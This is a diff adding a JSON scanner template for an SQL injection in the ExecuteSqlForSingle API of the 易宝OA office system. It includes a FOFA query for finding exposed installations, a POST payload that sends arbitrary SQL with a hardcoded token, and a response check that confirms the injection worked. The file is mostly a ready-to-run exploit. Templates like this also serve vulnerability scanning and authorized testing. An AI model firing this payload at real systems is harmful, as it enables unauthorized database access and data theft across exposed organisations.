@@ -1,0 +1,36 @@
+{
+  "product": "易宝OA",
+  "vul_name": "易宝OA ExecuteSqlForSingle接口SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "易宝OA系统是一种专门为企业和机构的日常办公工作提供服务的综合性软件平台，具有信息管理、 流程管理 、知识管理（档案和业务管理）、协同办公等多种功能。易宝OA系统ExecuteSqlForSingle接口存在SQL注入漏洞。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "product=\"顶讯科技-易宝OA系统\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484665&idx=1&sn=b21dce8ba3db849560e2c295f31182ac&chksm=974b89fea03c00e8b28eb9a70c78659ad9d838ee763c942ce63da9d8e98ad4a95b7823c8b4c8&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [
+    "请自行联系厂商打补丁"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/api/system/ExecuteSqlForSingle",
+      "data": "token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
